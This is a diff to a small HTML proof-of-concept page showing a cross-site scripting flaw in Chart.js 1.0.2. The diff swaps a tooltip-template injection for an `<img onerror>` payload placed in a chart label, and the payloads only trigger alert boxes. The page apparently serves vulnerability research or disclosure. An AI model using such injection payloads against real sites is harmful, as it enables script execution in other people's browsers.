@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Chart.js 1.0.2 XSS PoC</title>
+  <title>Chart.js 1.0.2 XSS PoC (Label Injection)</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/1.0.2/Chart.min.js"></script>
 </head>
 <body>
@@ -12,9 +12,9 @@
     var ctx = document.getElementById("myChart").getContext("2d");
 
     var data = {
-      labels: ["Red", "Blue", "Yellow"],
+      labels: ["Red", "Blue", "<img src='x' onerror='alert(\"XSS from label\")'>"],
       datasets: [{
-        label: "Malicious Dataset",
+        label: "Dataset",
         data: [12, 19, 3],
         fillColor: "rgba(220,220,220,0.5)",
         strokeColor: "rgba(220,220,220,0.8)",
@@ -23,11 +23,7 @@
       }]
     };
 
-    var options = {
-      tooltipTemplate: "<img src=x onerror=alert('XSS from tooltip')>"
-    };
-
-    var myBarChart = new Chart(ctx).Bar(data, options);
+    var myBarChart = new Chart(ctx).Bar(data);
   </script>
 </body>
 </html>
